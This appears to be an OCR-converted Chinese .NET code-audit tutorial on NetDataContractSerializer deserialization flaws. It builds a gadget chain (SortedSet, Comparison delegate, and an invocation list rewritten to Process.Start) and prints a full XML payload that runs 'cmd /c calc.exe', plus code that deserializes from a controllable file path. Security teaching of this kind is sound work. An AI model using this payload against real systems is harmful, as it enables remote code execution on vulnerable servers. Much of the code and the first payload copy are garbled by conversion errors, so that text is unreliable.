<!--
Source: G:\tmp\安全项目研究\.netskill\.NET高级代码审计（第七课） NetDataContractSerializer反序列化漏洞.pdf-d05f2538-cbd4-48c8-b733-5f58e9ead590\full.md
Archived as: NetDataContractSerializer raw lesson material
Purpose: provenance-only reference for authorized .NET code audit skill development.
Do not load by default; prefer structured references unless exact source context is needed.
-->
.NET 高级代码审计（第七课） NetDataContractSerializer 反序列化漏洞

Ivan1ee

2019 年 03 月 01 日

# 0x00 前言

NetDataContractSerializer 和 DataContractSerializer 一样用于序列化和反序列化Windows Communication Foundation (WCF) 消息中发送的数据。两者 之间存在一个重要区别：NetDataContractSerializer 包含了 CLR，通过 CLR 类型添加额外信息并保存引用来支持类型精确，而 DataContractSerializer 则不包含。 因此，只有在序列化和反序列化端使用相同的 CLR 类型时，才能使用 NetDataContractSerializer。若要序列化对象使用 WriteObject 或者 Serialize 方法， 若要反序列化 XML 流使用ReadObject 或者 Deserialize 方法。在某些场景下读取了恶意的 XML 流就会造成反序列化漏洞，从而实现远程 RCE 攻击，本文笔者从原理和代码审计的视角做了相关介绍和复现。

# 0x01 NetDataContractSerializer 序列化

使用 WriteObject 或者 Serialize 可以非常方便的实现.NET 对象与 XML 数据之间的转化，注意 NetDataContractSerializer 包含了程序集的名字和被序列化类型的类型。这些额外信息可以用来将 XML 反序列化成特殊类型，允许相同类型可以在客户端和服务端同时使用。另外的信息是 z:Id 属性在不同的元素上意义是不同的。这个用来处理引用类型以及当 XML 被反序列化时是否引用可以保留，最后的结论是这个输出相比DataContractSerializer 的输出包含了更多信息。下面通过一个实例来说明问题，首先定义 TestClass 对象

[DataContract]   
public class TestClass{ private string classname; private string name; private int age; [DataMember] public string classname { get $\Rightarrow$ classname; set $\Rightarrow$ classname $=$ value;} [DataMember] public string Name { get $\Rightarrow$ name; set $\Rightarrow$ name $=$ value;} [DataMember] public int Age { get $\Rightarrow$ age; set $\Rightarrow$ age $=$ value;} public override stringToString() { return base.ToString(); } public static void ClassMethod( string value) { Process.Start(value); }

定义了三个成员，并实现了一个静态方法ClassMethod启动进程。 序列化通过创建对象实例分别给成员赋值

```txt
TestClass testClass = new TestClass();
testClass.Age = 18;
testClass.Name = "Ivan1ee";
testClass.Classname = "360";
FileStream stream = new FileStream(@d:\netdata.xml, FileMode.Create);
NetDataContractSerializer netDataContractSerializer = new NetDataContractSerializer();
netDataContractSerializer SZialize(stream, testClass);
stream.Close(); 
```

笔者使用 Serialize 得到序列化 TestClass 类后的 xml 数据

```xml
<TestClass z:Id="1" z:Type="WpfApp1.TestClass"  
z:Assembly="WpfApp1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=NULL"  
xmlns="http://schemas.datacontract.org/2004/07/WpfApp1"  
xmlns:i="http://www.w3.org/2001/XMLSchema-instance"  
xmlns:z="http://schemas.microsoft.com/2003/10/Enumeration/"  
<age>18</age></classname  
z:Id="2">360</classname></name  
z:Id="3">Ivan1ee</name></TestClass> 
```

# 0x02 NetDataContractSerializer 反序列化

# 2.1、反序列化用法

NetDataContractSerializer 类反序列过程是将 XML 流转换为对象，通过创建一个新对象的方式调用 ReadObject 多个重载方法或 Serialize 方法实现的，查看定义得知继承自 XmlObjectSerializer 抽象类、IFormatter 接口，

```cs
Enamespace SystemRuntime.Serialization   
public sealed class NetDataContractSerializer : XmlObjectSerializer, IFORMTER   
public NetDataContractSerializer(); public NetDataContractSerializer(StreamingContext context); public NetDataContractSerializer(string rootName, string rootNamespace); public NetDataContractSerializer(XmDictionaryString rootName,XmlDictionaryString rootNamespace); public NetDataContractSerializer(String StreamingContext context, int maxItemsInobjectGraph, bool ignoreExtensionDataobject, FormaterAssem public NetDataContractSerializer(string rootName, string rootNamespace, StreamingContext context, int maxItemsInobjectGraph, bool ig public NetDataContractSerializer(XmDictionaryString rootName,XmlDictionaryString rootNamespace, StreamingContext context, int maxI   
public FormaterAssemblyStyle AssemblyFormat { get; set; } public ISurrogateSelector SurrogateSelector { get; set; } public SerializationBinder Binder { get; set; } public StreamingContext Context { get; set; } public int MaxItemsInobjectGraph { get; } public bool IgnoreExtensionDataobject { get; }   
public object Deserialization(Stream stream); public override bool IsStartObject(XmReader reader); public override bool IsStartObject(XmDictionaryReader reader); public override object ReadObject(XmReader reader); public override object ReadObject (XmlReader reader, bool verifyobjectName); public override object ReadObject (XmlDictionaryReader reader, bool verifyobjectName); public void SZarize(Strem stream, object graph); public override void WriteEndobject(XmDictionaryWriter writer); public override void WriteEndobject(XmWriter writer); public override void WriteObject(XmWriter writer, object graph); public override void WriteObjectContent(XmWriter writer, object graph); public override void WriteObjectContent(XmDictionaryWriter writer, object graph); public override void WriteStartObject(XmWriter writer, object graph); public override void WriteStartObject(XmDictionaryWriter writer, object graph);   
} 
```

NetDataContractSerializer 类实现了 XmlObjectSerializer 抽象类中的 WriteObject、ReadObject 方法，也实现了 IFormatter 中定义的方法。笔者通过创建新对象的方式调用 Deserialize 方法实现的具体实现代码可参考以下

```txt
FileStream stream2 = new FileStream(@"d:\netdata1.xml", FileMode.Open);
NetDataContractSerializer netDataContractSerializer = new NetDataContractSerializer();
var person =IELTBStream2;
MessageBox.Show((TestClass)person.Name);
stream2.Close(); 
```

其实在 Deserialize 方法内也是调用了 ReadObject 方法反序列化的

```txt
public void serialize STREAM stream, object graph)  
{ base.WriteObject(stream, graph); } public object Deserialization(Stream stream) { return base.ReadObject逵); } 
```

反序列化后得到对象的属性，打印输出当前成员 Name 的值。

```javascript
FileStream stream2 = new FileStream(@d:\netdata1.xml", FileMode.Open);
NetDataContractSerializer netDataContractSerializer = new DataContractSerializer();
var person = dataContractSerializer.Deserialization(stream2);
MessageBox.Show(((TestClass)person).Name);
stream2.Close(); 
```

# 2.2、攻击向量—MulticastDelegate

多路广播委托（MulticastDelegate）继承自 Delegate，其调用列表中可以拥有多个元素的委托，实际上所有委托类型都派生自 MulticastDelegate。MulticastDelegate 类的_invocationList 字段在构造委托链时会引用委托数组，但为了取得对委托链更多的控制就得使用 GetInvocationList 方法，它是具有一个带有链接的委托列表，在对委托实例进行调用的时候，将按列表中的委托顺序进行同步调用，那么如何将 calc.exe 添加到 GetInvocationList 列表方法？首先先看 Comparison<T>类，它用于位于命令空间System.Collections.Generic，定义如下

```txt
namespace System
{
    ...public delegate int Comparison<T>(T x, T y);
} 
```

Comparison 类返回委托，再使用 Delegate 或者 MulticastDelegate 类的公共静态方

法 Combine 将委托添加到链中作为 Comparison 的类型比较器

```java
Delegate da = new Comparison<String>(StringCompare);  
Comparison<String> d = (Comparison<String>)MulticastDelegate Combine(da, da); 
```

使用 Comparer<T>的静态方法 Create 创建比较器，比较器对象在.NET 集合类中使用的频率较多，也具备了定制的反序列化功能，这里选择 SortedSet<T>类，在反序列化的时内部 Comparer 对象重构了集合的排序。

```txt
IComparator<string> comp = Comparator<string>.Create(d); SortedSet<string> set = new SortedSet<string>(comp); set.Add("cmd"); set.Add("/c + cmd); 
```

多路广播委托的调用列表 GetInvocationList 方法在内部构造并初始化一个数组，让它的每个元素都引用链中的一个委托，然后返回对该数组的引用，下面代码修改了私有字段_InvocationList 并用泛型委托 Func 返回 Process 类。

```cpp
FieldInfo fi = typeof(MulticastDelegate).GetField("invocationList", BindingFlags.NonPublic | BindingFlags Instance); object[] invoke_list = d.GetInvocationList(); // Modify the invocation list to add Process::Start(string, string) invoke_list[1] = new Func<string, string, Process>(Process.Start); fi.SetValue(d, invoke_list); 
```

最后传入攻击载荷后得到完整序列化后的 poc，如下

```txt
arrayofString z: \(= 1\) "z:Type \(\equiv\) "System.Collections.Generic&SortedSet1[[System.String, mscorlib, Version-4.0.0.0, Culture-m] type Asx#1 #1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1#1 #Assembly="System, Version-4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"] xmlns="http://schemas.microsoft.com/2005/02/04/Serialization/A#/axys   
xmls: \(= 1\) "http://www.w3.org/2001/XMLSchema-instance" xmls:x="http://www.w3.org/2001/XMLSchema" xmlns:z="http://schemas.microsoft.com/2003/10/Serialization/\(x<count   
z:=d"z:"Type \(\equiv\) "System.Int32"z:Assembly \(\equiv\) "0" xmlns \(\equiv\) "2/<Count>Comparison z: \(= 3\) "z:"Type \(\equiv\) "System.Collections.Generic.ComparisonComparator" [1[System.String, mscorlib, Version-4.0.0.0, Culture=neutral, PublicKeyToken b77a5c561934e089]] z:\Assembly \(\equiv\) "0" xmlns \(\equiv\) "x Comparison z: \(= 4\) "z:"Type \(\equiv\) "a:DelegateSerializationHolder"   
z:=type \(\equiv\) "System.DelegateSerializationHolder" z:\Assembly \(\equiv\) "0" xmlns \(\equiv\) "http://schemas.Datacontractord.org/2004/07/System.Collections.Generic"   
xmls: \(= 1\) "http://schemas.Datacontractord.org/2004/07/System >Delegate z: \(= 5\) "z:"Type \(\equiv\) "System.DelegateSerializationHolder>DelegateEntry" z:\Assembly \(\equiv\) "0"\nxmls":\(\equiv\) a:assembly \(\equiv\) "6"mscorlib, Version-4.0.0.0, Culture-neutral, PublicKeyToken b77a5c561934e089】/a:assembly \(\equiv\) "a:delegationentry z: \(= 7\) "xa:assembly z:\Ref="6" i:nil="true"/a:delegationentry i:nil="true"/a:methodName z: \(= 8\) "compare/a:methodName>x:a:target i:nil="true"/a:targetTypeAssembly z:\Ref="6" i:nil="true"/a:targetType"   
z:=type \(\equiv\) "System.TargetedName z:=id="9"System.Name</a:targetTypeName>x:a:type z:=id="10"System.TargetedName z:\TargetedItem [1[System.String, mscorlib, Version-4.0.0.0, Culture-neutral, PublicKeyToken b77a5c561934e089]]</a:type>x:a:delegationentry x:\ref{methodName z:=id="11"Start</a:methodName>x:a:targetTypeAssembly x:\Ref="6"   
z:=id="22"system VERSION-4.0.0.0, Culture-neutral, PublicKeyToken b77a5c561934e089】/a:/type>x/Delagat \(\equiv\) "methodo z: \(= 15\) "z:FactoryType \(\equiv\) "b:MemberInfoSerializationHolder"   
z:=type \(\equiv\) "System.Deflection.MemberInfoSerializationHolder" z:\Assembly \(\equiv\) "0" xmls:x="xxx"xmls:b="http://schemas.Datacontractord.org/2004/07/System.Reflection">XName z:\Ref="11" i:nil="true"/a:Assembly n :Ref="12" i:nil="true"/x<Signature z: \(= 16\) "z:"Type \(\equiv\) "System.String"   
publicKeyToken b77a5c561934e089],[System.String, mscorlib, Version-4.0.0.0, Culture-neutral, PublicKeyToken b77a5c561934e089]]</a:/type>x/Delagat \(\equiv\) "methodo z: \(= 15\) "z:FactoryType \(\equiv\) "b:MemberInfoSerializationHolder"   
z:=type \(\equiv\) "System.Deflection.MemberInfoSerializationHolder" z:\Assembly \(\equiv\) "0" xmls:x="xxx"xmls:b="http://schemas.Datacontractord.org/2004/07/System.Reliflection">XName z:\Ref="8" i:nil="true"/a:Assembly n :Ref="9" i:nil="true"/x<Signature z: \(= 16\) "z:"Type \(\equiv\) "System.String"   
assembly \(\equiv\) "0"\*System.Diagnostics.Process Start(System.String, System.String) </signature>2<xigature>2:x:\Type \(\equiv\) "System.String"   
assembly \(\equiv\) "0"\*System.Diagnostics.Process Start(System.String, System.String) </signature>2<xigature>2:x:\Type \(\equiv\) "System.Int32"   
assembly \(\equiv\) "0"\*R/B/MemberType x:\GenericArguments i:nil="true"/x methodo x:\methodi:d = 19"x:FactoryType \(\equiv\) "b:MemberInfoSerializationHolder"   
z:=type \(\equiv\) "System.Deflection.MemberInfoSerializationHolder" z:\Assembly \(\equiv\) "0"x"xmls:x="xxx"xmls:b="http://schemas.Datacontractord.org/2004/07/System.Reflection">XName z:\Ref="g" i:nil="true"/x<Signature n :Ref="6" i:nil="true"/x<Signature n :Ref="9" i:nil="true"/x<Signature n :Ref="29"x:FactoryType \(\equiv\) "S:"System.String" x:\Assembly \(\equiv\) "0">Int32 Compare (System.String, System string). </signature>2<xigature>2:x:\Type \(\equiv\) "System.String" x:\Assembly \(\equiv\) "0">System.Int32 Compare (System.String, System string) </signature>2<xigature>2:x:\Type \(\equiv\) "System.Int32" x:\Assembly \(\equiv\) "0">x<Signature n :Ref="22" x:\Type \(\equiv\) "System.Int32" x:\Assembly \(\equiv\) "0">x<MembershipType x:\ilil="true"/x/>/methodi:x=\~/x/comparison><comparer><version>   
z:=type \(\equiv\) "System.Int32" x:\Assembly \(\equiv\) "0"x\\nxmls:d=24"x:"type \(\equiv\) "System.String"] z:\Assembly \(\equiv\) "0"x size=2"x\\nxmls:d=25"x\\nxmls:h:http://schemas.microsoft.com/2003/10/Serialization/Arrays"/>c calc.exe//string.x:/ident.x:/ItemsOfString   
xmls:"http://schemas.microsoft.com/2003/10/Serialization/Arrays"/>cmd//string></ItemsOfString 
```

# 0x03 代码审计视角

# 3.1、Deserialize

从代码审计的角度只需找到可控的Path路径就可以被反序列化，例如以下场景：

public static object Deserialization(string path)   
{ FileStreamFileStream $=$ new FileStream(path,FileMode.Open); NetDataContractSerializer netDataAdapterSerializer $=$ new NetDataAdapterSerializer(); var objects $=$ IELoader.Deserialization(fileStream); return objects;   
}

# 3.2、ReadObject

public static object ReadObjectData(string path)   
{ FileStream fileStream $\equiv$ new FileStream(path,FileMode.Open); NetDataContractSerializer netDataAdapterSerializer $\equiv$ new NetDataContractSerializer(); var objects $=$ netDataAdapterSerializer.ReadObject(fileStream); return objects;

上面两种方式都是很常见的，需要重点关注。

# 0x04 案例复盘

1. 代码中实现读取本地文件内容

public class DataContractSerializerHelper   
{ public static object Deserialization(string path) { FileStreamFileStream $=$ new FileStream(path,FileMode.Open); NetDataContractSerializer netDataContractSerializer $=$ new DataContractSerializer(); var objects $=$ IELNetDataContractSerializer.Deserialization(fileStream); return objects; }

2. 传递 poc xml，弹出计算器网页返回 200

```txt
3. <ArrayOfstring z:Id="1"  
z:Type="System.Collections.Generic.SortSet`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]"  
z:Assembly="System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"  
xmlns="http://schemas.microsoft.com/2003/10/Enumeration/Arrays"  
xmlns:i="http://www.w3.org/2001/XMLSchema-instance"  
xmlns:x="http://www.w3.org/2001/XMLSchema"  
xmlns:z="http://schemas.microsoft.com/2003/10/Seriali 
```

```txt
zation/"><Count z:Id="2" z:Type="System.Int32"  
z:Assembly="0" xmlns=""/>2</Count><Comparator z:Id="3"  
z:Type="System.Collections.Generic.ComparisonComparator`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]"  
z:Assembly="0" xmlns=""/><comparison z:Id="4"  
z:FactoryType="a:DelegateLocalizationHolder"  
z:Type="SystemDelegateLocalizationHolder"  
z:Assembly="0"  
xmlns="http://schemas.datacontract.org/2004/07/System.Collections.Generic"  
xmlns:a="http://schemas.datacontract.org/2004/07/System"> <Delegate z:Id="5"  
z:Type="System.DelegateLocalizationHolder+DelegateEntry" z:Assembly="0" xmlns=""/><a:assembly  
z:Id="6">mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</a:assembly></a:delegataEntry z:Id="7"><a:assembly z:Ref="6"  
i-nil="true"/><a:delegateEntry  
i-nil="true"/><a:methodName  
z:Id="8">Compare</a:.methodName><a:target  
i-nil="true"/><a:targetTypeAssembly z:Ref="6"  
i-nil="true"/><a:targetTypeName  
z:Id="9">System.String</a:targetTypeName><a:type  
z:Id="10">System.Comparison`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]</a:typeof></a:delegate  
eEntry><a:(methodName  
z:Id="11">Start</a:MethodName><a:target  
i-nil="true"/><a:targetTypeName z:Id="12">System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</a:targetTypeName  
<x:a:targetTypeName  
z:Id="13">System.Diagnostics.Process</a:targetTypeName  
e<x:a:type z:Id="14">System.Func`3[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, 
```

PublicKeyToken $\equiv$ b77a5c561934e089],[System.String, mscorlib, Version $= 4.0.0.0$ ,Culture $\equiv$ neutral, PublicKeyToken $\equiv$ b77a5c561934e089],[System.Diagnostics. Process, System, Version $= 4.0.0.0$ ,Culture $\equiv$ neutral, PublicKeyToken $\equiv$ b77a5c561934e089]</a:type></Delegate> <method0 z:Id="15" z:FactoryType $\equiv$ "b:MemberInfoSerializerHolder" z:Type $\equiv$ "System.ReferenceMemberInfoSerializerHolder" z:Assembly $\equiv$ "0" xmlns $\equiv$ "" xmlns:b $\equiv$ "http://schemas.datacontract.org/2004/07/System-reflection"><Name z:Ref $\equiv$ "11" i:nil $\equiv$ "true"/><AssemblyName z:Ref $\equiv$ "12" i:nil $\equiv$ "true"/><ClassName z:Ref $\equiv$ "13" i:nil $\equiv$ "true"/><Signature z:Id $\equiv$ "16" z:Type $\equiv$ "System.String" z:Assembly $\equiv$ "0">System.Diagnostics.Process Start(System.String, System.String) $<  /$ Signature><Signature2 z:Id $\equiv$ "17" z:Type $\equiv$ "System.String" z:Assembly $\equiv$ "0">System.Diagnostics.Process Start(System.String, System.String) $<  /$ Signature2 $>$ <MemberType z:Id $\equiv$ "18" z:Type $\equiv$ "System.Int32" z:Assembly $\equiv$ "0">8</MemberType><GenericArguments i:nil $\equiv$ "true"/><method0><method1 z:Id $\equiv$ "19" z:FactoryType $\equiv$ "b:MemberInfoSerializerHolder" z:Type $\equiv$ "System.ReferenceMemberInfoSerializerHolder" z:Assembly $\equiv$ "0" xmlns $\equiv$ "" xmlns:b $\equiv$ "http://schemas.datacontract.org/2004/07/System-reflection"><Name z:Ref $\equiv$ "8" i:nil $\equiv$ "true"/><AssemblyName z:Ref $\equiv$ "6" i:nil $\equiv$ "true"/><ClassName z:Ref $\equiv$ "9" i:nil $\equiv$ "true"/><Signature z:Id $\equiv$ "20" z:Type $\equiv$ "System.String" z:Assembly $\equiv$ "0">Int32 Compare(System.String, System.String) $<  /$ Signature $>$ <Signature2 z:Id $=$ "21" z:Type $\equiv$ "System.String" z:Assembly $\equiv$ "0">System.Int32

```txt
Compare(System.String, System.String)</Signature2><MemberType z:Id="22" z:Type="System.Int32" z:Assembly="0">8</MemberType><GenericArguments i-nil="true";//method1></_comparison></Comparison> <Version z:Id="23" z:Type="System.Int32" z:Assembly="0" xmlns=">>2</Version><Items z:Id="24" z:Type="System.String[]" z:Assembly="0" z:Size="2" xmlns=">>string z:Id="25" xmlns="http://schemas.microsoft.com/2003/10/Localization/Arrays"/c calc.exe</string><string z:Id="26" xmlns="http://schemas.microsoft.com/2003/10/Localization/Arrays">cmd</string></Items></ArrayOfstring> 
```

# 最后配上动态图演示

![](images/8e2feec55e3486e6a5a09501e3d88109a9d910d9a0a93ff4c45a66fa90544f10.jpg)

# 0x05 总结

NetDataContractSerializer 序列化功能输出的信息更多，因为性能等原因不及

DataContractSerializer，所以在 WCF 开发中用的场景并不太多，但是因为它无需传入类型解析器所以相对来说更容易触发反序列化漏洞。最后.NET 反序列化系列课程笔

者会同步到 https://github.com/Ivan1ee/ 、https://ivan1ee.gitbook.io/ ，后续笔者

将陆续推出高质量的.NET 反序列化漏洞文章，欢迎大伙持续关注，交流，更多的.NET

安全和技巧可关注实验室公众号。

![](images/261c85881289861a99dfbd1a878629ef6ff93dd7f75a97da716503cab1bcca2c.jpg)
